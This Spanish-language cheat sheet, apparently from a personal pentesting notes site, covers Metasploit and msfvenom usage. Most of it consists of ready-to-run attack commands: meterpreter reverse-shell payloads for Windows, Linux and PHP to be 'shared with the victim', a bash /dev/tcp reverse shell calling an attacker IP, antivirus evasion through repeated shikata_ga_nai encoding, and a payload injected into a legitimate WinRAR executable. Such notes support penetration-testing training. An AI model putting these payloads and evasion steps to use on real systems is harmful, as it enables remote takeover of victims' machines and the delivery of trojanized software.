---
title: "Metasploit Y Msfvenom"
layout: "single"
category: "Varios"
slug: "varios/metasploit-y-msfvenom"
date: "2025-09-30"
---

### Metasploit basics
```bash
* msfdb init && msfconsole (abrir metasploit con la bbdd para luego pivoting)
* search <CVE-****> (buscar exploits)
* search <windows | nombre de la vuln ..>
* use <modulo> (utilizar un exploit)
* show options (para ver lo que podemos aplicar en un exploit)
* info (ver los targets disponibles, opciones, etc)
* set (establecer un parámetro)
* run (lanzar un exploit)
* shell (obtener una shell cuando ya hemos establecido una sesión de meterpreter)
* sessions -l (listar sesiones)
* sessions -K (kill sessions)
* sessions <numero> entrar en una sesión


#METERPRETER migrar sesion de meterpreter x86 a x64
pgrep explorer (esto nos dará el PID del proceso explorer)
migrate <numero> (el numero del proceso obtenido)

#METERPRETER BASICS
* sysinfo
* getprivs
*  getuid
* 
```

### Payloads con MsfVenom

#### MsfVenom Basics
```bash
msfvenom --list payloads
msfvenom --list enconders (para codificar y tratar de evadir el AV)
```
#### Payload sesión meterpreter Windows
Esto es útil entre otras cosas para el pivoting con metasploit. De esta forma conseguimos una sesión de meterpreter.
```bash
#Generamos el payload y lo compartimos con la víctima
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_atacante> LPORT=443 -f exe -o fichero.exe


# Nos ponemos a la escucha con msfconsole (metasploit)
msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LPORT=443
set LHOST=<ip_atacante>
run

# Ya solo falta ejecutar el .exe y recibiremos la sesión de meterpreter

```

#### Payload sesión meterpreter Linux
Igual que con Windows, solo que cambiamos el payload utilizado, en este caso:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
#### Payload reverse shell PHP
```bash
#Generamos el payload y lo compartimos con la víctima
msfvenom -p php/reverse_php LHOST=<ip_atacante> LPORT=<puerto_atacante> -f raw > pwned.php

Ahora nos ponemos a la escucha con netcat y listo. IMPORTANTE, esta conexion se puede cerrar. así que una vez dentro es conveniente ejecutar una nueva reverse shell.

# Segunda reverse shell
bash -c "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1"

y nos ponemos a la escucha con netcat
```

#### Payload encoding (AV evasion)
Al generar un payload con msfvenom, añadimos el argumento -e y el encoder especificado.

con la opción -i indicamos las iteraciones al codificar un payload (si se dan muchisimas iteraciones también podríamos llamar la atención)
```bash
msfvenom --list encoders
msfvenom -p ...... -e x86/shikata_ga_nai -i 10
```

#### Inyectar payload en ejecutable legítimo
Teniendo un portable, podemos incluir nuestro código payload en él con la opción -x indicando la ruta del portable.
```bash
msfvenom -p ...... -e x86/shikata_ga_nai -i 10 -x /home/kali/winrarportable.exe
```
